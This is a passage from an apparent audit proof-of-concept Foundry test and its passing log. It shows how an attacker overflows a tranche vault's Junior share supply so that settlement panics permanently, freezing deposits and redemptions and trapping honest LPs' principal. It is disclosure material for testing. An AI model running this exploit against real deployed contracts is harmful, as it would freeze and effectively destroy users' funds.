        (uint256 fundedHonestShares, uint256 honestControlPayout) =
            _claimAsyncRedeem(juniorVault, honestControlId, honestJunior);
        assertEq(fundedHonestShares, honestShares, "control funds the full honest Junior balance");
        assertGe(honestControlPayout, 25e6, "honest Junior principal is actually withdrawable");
        assertEq(settlementToken.balanceOf(honestJunior), honestWalletBefore + honestControlPayout);
        assertLt(pool.juniorPrincipal(), controlJuniorBefore, "control redemption reduces Junior principal");
        console2.log("honest Junior completed control payout atoms", honestControlPayout);
        assertTrue(vm.revertToState(honestExitSnapshot), "restore valuable-share state for final mint");

        (uint256 finalEpoch,) = juniorVault.getRequestEpochWindow();
        uint256 finalMaturity = pool.lpEpochStart(finalEpoch);
        uint256 due = pool.seniorPrincipal() * 800 * (finalMaturity - pool.lastSeniorCouponCheckpointTime())
            / (10_000 * 365 days);
        uint256 amount = pool.juniorPrincipal() - due + 1;
        uint256 quoted = juniorVault.quoteDepositFromState(amount, pool.juniorPrincipal() - due, targetRaw, 0);
        assertEq(quoted, targetRaw + 1000, "single final deposit lands at overflow supply");
        uint256 finalId = _requestAsyncDeposit(juniorVault, ATTACKER, amount);
        assertEq(finalId, finalEpoch);
        console2.log("matured-head final deposit epoch", finalId);
        uint256 noDustSnapshot = vm.snapshotState();

        uint256 afterCutoff = finalMaturity - 5 minutes;
        vm.warp(afterCutoff);
        uint256 dustShares = juniorVault.balanceOf(dustAttacker);
        uint256 dustValueBefore = juniorVault.estimateRedeemAssets(dustShares);
        assertGe(dustValueBefore, 1e6, "dust request passes the ordinary minimum");
        uint256 dustRedeemId = _requestAsyncRedeem(juniorVault, dustAttacker, dustShares);
        assertEq(dustRedeemId, finalEpoch + 1, "dust head matures after final mint");
        console2.log("matured-head dust redeem epoch", dustRedeemId);
        console2.log("dust Junior pre-landing value atoms", dustValueBefore);
        (uint256 earlyHead, uint256 earlyShares) = juniorVault.getMaturedRedeemHead(finalEpoch);
        assertEq(earlyHead, 0);
        assertEq(earlyShares, 0);

        vm.warp(finalMaturity);
        pool.settleLpEpoch(0, 0);
        _claimAsyncDeposit(juniorVault, finalId, ATTACKER);
        assertEq(juniorVault.totalSupply(), type(uint256).max - 1, "final mint lands despite future dust head");
        console2.log("matured-head variant raw supply", juniorVault.totalSupply());
        uint256 honestValueLowerBound = Math.mulDiv(honestShares, pool.juniorPrincipal(), type(uint256).max);
        assertGe(honestValueLowerBound, 25e6, "honest Junior LP has material frozen principal");
        console2.log("honest Junior post-landing value lower bound atoms", honestValueLowerBound);
        vm.warp(pool.lpEpochStart(dustRedeemId));
        (uint256 maturedId, uint256 maturedShares) = juniorVault.getMaturedRedeemHead(dustRedeemId);
        assertEq(maturedId, dustRedeemId);
        assertEq(maturedShares, dustShares);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);

        vm.prank(dustAttacker);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(dustRedeemId, dustAttacker, dustAttacker);
        vm.prank(honestJunior);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        juniorVault.requestRedeem(honestShares, honestJunior, honestJunior);

        uint256 maturedHeadSnapshot = vm.snapshotState();
        pool.pause();
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        console2.log("matured Junior head also blocks paused settlement");
        assertTrue(vm.revertToState(maturedHeadSnapshot), "restore before owner and backlog bypass checks");

        uint256 ownerCapacity = 4 * pool.juniorPrincipal() - pool.seniorHighWaterMark() - 1000;
        settlementToken.mint(address(this), ownerCapacity);
        settlementToken.approve(address(engine), ownerCapacity);
        engine.recapitalizePool(ownerCapacity);
        pool.assignUnassignedAssets(true, address(this));
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        console2.log("matured Junior head blocks settlement after owner recapitalization");
        pool.pauseLpEpochSettlement();
        vm.expectRevert(abi.encodeWithSignature("HousePool__LpEpochSettlementPaused()"));
        pool.settleLpEpoch(0, 0);
        pool.unpauseLpEpochSettlement();
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);

        _finishAsyncCooldown(seniorVault, address(this));
        uint256 firstSeniorId = _requestAsyncRedeem(seniorVault, address(this), seniorVault.convertToShares(2e6));
        vm.warp(pool.lpEpochStart(firstSeniorId));
        uint256 seniorBefore = pool.seniorPrincipal();
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        assertEq(pool.seniorPrincipal(), seniorBefore, "single Senior head payment rolls back with Junior panic");

        uint256 lastSeniorId = firstSeniorId;
        for (uint256 i = 1; i < 17; ++i) {
            vm.warp(pool.lpEpochStart(lastSeniorId));
            lastSeniorId = _requestAsyncRedeem(seniorVault, address(this), seniorVault.convertToShares(2e6));
        }
        vm.warp(pool.lpEpochStart(lastSeniorId));
        pool.settleLpEpoch(0, 0);
        assertLt(pool.seniorPrincipal(), seniorBefore, "sixteen Senior heads bypass the Junior phase");
        console2.log("Senior bypass funded atoms", seniorBefore - pool.seniorPrincipal());
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        console2.log("last Senior tail head remains blocked after backlog bypass");

        assertTrue(vm.revertToState(maturedHeadSnapshot), "restore before projected-wipe persistence check");
        vm.warp(block.timestamp + 827 * 365 days);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        vm.prank(dustAttacker);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(dustRedeemId, dustAttacker, dustAttacker);
        console2.log("matured Junior head still blocks after 827 years");

        assertTrue(vm.revertToState(noDustSnapshot), "restore same pre-landing state without dust request");
        vm.warp(finalMaturity);
        pool.settleLpEpoch(0, 0);
        assertEq(juniorVault.totalSupply(), type(uint256).max - 1, "control lands without dust request");
        uint256 controlOwnerCapacity = 4 * pool.juniorPrincipal() - pool.seniorHighWaterMark() - 1000;
        settlementToken.mint(address(this), controlOwnerCapacity);
        settlementToken.approve(address(engine), controlOwnerCapacity);
        engine.recapitalizePool(controlOwnerCapacity);
        pool.assignUnassignedAssets(true, address(this));
        _finishAsyncCooldown(seniorVault, address(this));
        pool.pause();
        uint256 controlSeniorBefore = pool.seniorPrincipal();
        uint256 controlSeniorId = _requestAsyncRedeem(seniorVault, address(this), seniorVault.convertToShares(2e6));
        _settleAsyncRequest(controlSeniorId, false);
        assertLt(pool.seniorPrincipal(), controlSeniorBefore, "without dust head pause permits Senior exit");
        console2.log("same-state no-dust control Senior exit atoms", controlSeniorBefore - pool.seniorPrincipal());
    }
}
```

**Fresh Foundry log**

```text
No files changed, compilation skipped

Ran 1 test for test/perps/poc/JuniorVirtualOffsetOverflowE2E.t.sol:JuniorVirtualOffsetOverflowE2E
[PASS] test_JuniorShareOverflowFreezesDepositsAndRedemptions() (gas: 111530255)
Logs:
  ordinary 1000 USDG control shares 1000702866480
  initial J atoms 2007000999325
  initial Sp atoms 7999001000675
  next hourly coupon atoms 91379013
  target timestamp 1808700797
  post-long J atoms 100003455
  post-long Sp atoms 10005899494780
  post-long raw Junior S 2008338551471728
  next actual hourly coupon atoms 91378077
  settling cycle 0
  request epoch 502417
  cycle pre J 100003455
  cycle projected due 10229268
  cycle 0
  cycle timestamp 1808701200
  cycle J atoms 100003455
  cycle raw Junior S 2237177527745691
  settling cycle 1
  request epoch 502418
  cycle pre J 100003455
  cycle projected due 91378170
  settling cycle 2
  request epoch 502419
  cycle pre J 100003455
  cycle projected due 91379005
  settling cycle 3
  request epoch 502420
  cycle pre J 100003455
  cycle projected due 91379840
  settling cycle 4
  request epoch 502421
  cycle pre J 100003455
  cycle projected due 91380674
  settling cycle 5
  request epoch 502422
  cycle pre J 100003455
  cycle projected due 91381509
  settling cycle 6
  request epoch 502423
  cycle pre J 100003455
  cycle projected due 91382343
  settling cycle 7
  request epoch 502424
  cycle pre J 100003455
  cycle projected due 91383178
  settling cycle 8
  request epoch 502425
  cycle pre J 100003455
  cycle projected due 91384012
  settling cycle 9
  request epoch 502426
  cycle pre J 100003455
  cycle projected due 91384847
  settling cycle 10
  request epoch 502427
  cycle pre J 100003455
  cycle projected due 91385681
  cycle 10
  cycle timestamp 1808737200
  cycle J atoms 100003455
  cycle raw Junior S 98629587763109338667395122
  settling cycle 11
  request epoch 502428
  cycle pre J 100003455
  cycle projected due 91386516
  settling cycle 12
  request epoch 502429
  cycle pre J 100003455
  cycle projected due 91387350
  settling cycle 13
  request epoch 502430
  cycle pre J 100003455
  cycle projected due 91388185
  settling cycle 14
  request epoch 502431
  cycle pre J 100003455
  cycle projected due 91389020
  settling cycle 15
  request epoch 502432
  cycle pre J 100003455
  cycle projected due 91389854
  settling cycle 16
  request epoch 502433
  cycle pre J 100003455
  cycle projected due 91390689
  settling cycle 17
  request epoch 502434
  cycle pre J 100003455
  cycle projected due 91391523
  settling cycle 18
  request epoch 502435
  cycle pre J 100003455
  cycle projected due 91392358
  settling cycle 19
  request epoch 502436
  cycle pre J 100003455
  cycle projected due 91393193
  settling cycle 20
  request epoch 502437
  cycle pre J 100003455
  cycle projected due 91394027
  cycle 20
  cycle timestamp 1808773200
  cycle J atoms 100003455
  cycle raw Junior S 4390560580285471794624476877512823710
  settling cycle 21
  request epoch 502438
  cycle pre J 100003455
  cycle projected due 91394862
  settling cycle 22
  request epoch 502439
  cycle pre J 100003455
  cycle projected due 91395697
  settling cycle 23
  request epoch 502440
  cycle pre J 100003455
  cycle projected due 91396531
  settling cycle 24
  request epoch 502441
  cycle pre J 100003455
  cycle projected due 91397366
  settling cycle 25
  request epoch 502442
  cycle pre J 100003455
  cycle projected due 91398201
  settling cycle 26
  request epoch 502443
  cycle pre J 100003455
  cycle projected due 91399035
  settling cycle 27
  request epoch 502444
  cycle pre J 100003455
  cycle projected due 91399870
  settling cycle 28
  request epoch 502445
  cycle pre J 100003455
  cycle projected due 91400705
  settling cycle 29
  request epoch 502446
  cycle pre J 100003455
  cycle projected due 91401539
  settling cycle 30
  request epoch 502447
  cycle pre J 100003455
  cycle projected due 91402374
  cycle 30
  cycle timestamp 1808809200
  cycle J atoms 100003455
  cycle raw Junior S 197352779595089692614319753910466255810013280720
  settling cycle 31
  request epoch 502448
  cycle pre J 100003455
  cycle projected due 91403209
  settling cycle 32
  request epoch 502449
  cycle pre J 100003455
  cycle projected due 91404044
  settling cycle 33
  request epoch 502450
  cycle pre J 100003455
  cycle projected due 91404878
  settling cycle 34
  request epoch 502451
  cycle pre J 100003455
  cycle projected due 91405713
  settling cycle 35
  request epoch 502452
  cycle pre J 100003455
  cycle projected due 91406548
  settling cycle 36
  request epoch 502453
  cycle pre J 100003455
  cycle projected due 91407383
  settling cycle 37
  request epoch 502454
  cycle pre J 100003455
  cycle projected due 91408217
  settling cycle 38
  request epoch 502455
  cycle pre J 100003455
  cycle projected due 91409052
  settling cycle 39
  request epoch 502456
  cycle pre J 100003455
  cycle projected due 91409887
  settling cycle 40
  request epoch 502457
  cycle pre J 100003455
  cycle projected due 91410722
  cycle 40
  cycle timestamp 1808845200
  cycle J atoms 100003455
  cycle raw Junior S 8957390942490181272456496741846192325129650426584937255369
  settling cycle 41
  request epoch 502458
  cycle pre J 100003455
  cycle projected due 91411557
  settling cycle 42
  request epoch 502459
  cycle pre J 100003455
  cycle projected due 91412391
  settling cycle 43
  request epoch 502460
  cycle pre J 100003455
  cycle projected due 91413226
  settling cycle 44
  request epoch 502461
  cycle pre J 100003455
  cycle projected due 91414061
  settling cycle 45
  request epoch 502462
  cycle pre J 100003455
  cycle projected due 91414896
  settling cycle 46
  request epoch 502463
  cycle pre J 100003455
  cycle projected due 91415731
  settling cycle 47
  request epoch 502464
  cycle pre J 100003455
  cycle projected due 91416566
  settling cycle 48
  request epoch 502465
  cycle pre J 100003455
  cycle projected due 91417400
  settling cycle 49
  request epoch 502466
  cycle pre J 100003455
  cycle projected due 91418235
  settling cycle 50
  request epoch 502467
  cycle pre J 100003455
  cycle projected due 91419070
  cycle 50
  cycle timestamp 1808881200
  cycle J atoms 100003455
  cycle raw Junior S 410524676757992578649099821110774173829646477098651534186065247199061
  settling cycle 51
  request epoch 502468
  cycle pre J 100003455
  cycle projected due 91419905
  settling cycle 52
  request epoch 502469
  cycle pre J 100003455
  cycle projected due 91420740
  settling cycle 53
  request epoch 502470
  cycle pre J 100003455
  cycle projected due 91421575
  settling cycle 54
  request epoch 502471
  cycle pre J 100003455
  cycle projected due 91422410
  settling cycle 55
  request epoch 502472
  cycle pre J 100003455
  cycle projected due 91423245
  settling cycle 56
  request epoch 502473
  cycle pre J 100003455
  cycle projected due 91424080
  settling cycle 57
  request epoch 502474
  cycle pre J 100003455
  cycle projected due 91424914
  settling cycle 58
  request epoch 502475
  cycle pre J 100003455
  cycle projected due 91425749
  cycle 58
  cycle timestamp 1808910000
  cycle J atoms 49720857
  cycle raw Junior S 69475252505395786564533912836915328247245936280221572507465657349648718412965
  post producer senior principal 1252404
  post producer junior principal 49720857
  post burn raw Junior S 57896044618658097711785492504343953926634992332820282019728792003956564819467
  post burn Junior P atoms 41434030
  post burn Senior Sp atoms 1252426
  post burn Senior HWM minus Sp atoms 0
  pre-overflow control shares 1397306962217474860314917367524173467277251696379455385205895831588548849965
  final coupon atoms 11
  final A atoms 41434020
  post final raw Junior S 115792089237316195423570985008687907853269984665640564039457584007913129639934
  two matured LP settlement panic assertions passed
  matured victim cancellation revert assertion passed
  victim escrow atoms 1000000000
  overflow raw supply 115792089237316195423570985008687907853269984665640564039457584007913129639934
  post-overflow Junior P atoms 82868039
  post-overflow Senior Sp atoms 1252437
  post-overflow Senior HWM atoms 1252437
  owner Senior assignment capacity atoms 330218719
  owner-recapitalized Senior Sp atoms 331471167
  owner-recapitalized recovery seconds 98550280
  rate-only owner recovery seconds 8117319
  expanded-share owner capital atoms 826086410805
  rate-plus-share owner recovery seconds 262353
  owner-funded victim refund atoms 1000000000
  paused Senior redemption funded atoms 1993964
  earliest projected-coupon recovery seconds 26082414503
  recovery years 827
  late cancel refunded atoms 1000000000
  honest Junior pre-landing value atoms 29999992
  honest Junior completed control payout atoms 29999984
  matured-head final deposit epoch 502479
  matured-head dust redeem epoch 502480
  dust Junior pre-landing value atoms 1999999
  matured-head variant raw supply 115792089237316195423570985008687907853269984665640564039457584007913129639934
  honest Junior post-landing value lower bound atoms 29999983
  matured Junior head also blocks paused settlement
  matured Junior head blocks settlement after owner recapitalization
  Senior bypass funded atoms 31948280
  last Senior tail head remains blocked after backlog bypass
  matured Junior head still blocks after 827 years
  same-state no-dust control Senior exit atoms 1993964

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 55.38ms (50.65ms CPU time)

Ran 1 test suite in 56.21ms (55.38ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
